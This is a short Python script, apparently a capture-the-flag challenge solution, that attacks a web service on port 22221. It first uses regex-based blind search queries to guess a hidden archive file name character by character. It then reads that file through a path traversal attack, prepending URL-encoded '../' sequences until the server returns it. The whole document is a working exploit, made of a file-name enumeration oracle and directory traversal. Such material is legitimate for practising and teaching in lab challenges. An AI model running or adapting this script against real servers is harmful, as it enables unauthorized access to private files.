#!/usr/bin/env python3

import requests
import string
import sys

if len(sys.argv) > 1:
    HOST = sys.argv[1]
else:
    print("Usage: solution.py <HOST>")
    exit()

s = requests.Session()

name = ""
chars = string.ascii_letters + string.digits + "_-."

resp = s.get(f"http://{HOST}:22221/?search=")
    

while True:
    for char in chars:
        if char == ".":
            char = r"\."
        search = f"{name+char}.*"
        response = s.get(f"http://{HOST}:22221/?search=" + search)
        if response.text.find("*** TOP SECRET ARCHIVE FILE ***") != -1:
            name += char
            print(f"\r[+] Found: {name}", end="")
            continue
    if name[-4:] == ".txt":
        print("\nDONE")
        name = name.replace(r"\.",'.')
        break

resp = s.get(f"http://{HOST}:22221/front/")
smth = "%2E%2E/"
payload = f"archive/{name}"

while resp.status_code != 200:
    payload = smth + payload
    print("Trying: " + f"http://{HOST}:22221/front/" + payload)
    resp = s.get(f"http://{HOST}:22221/front/" + payload)
print(resp.text)
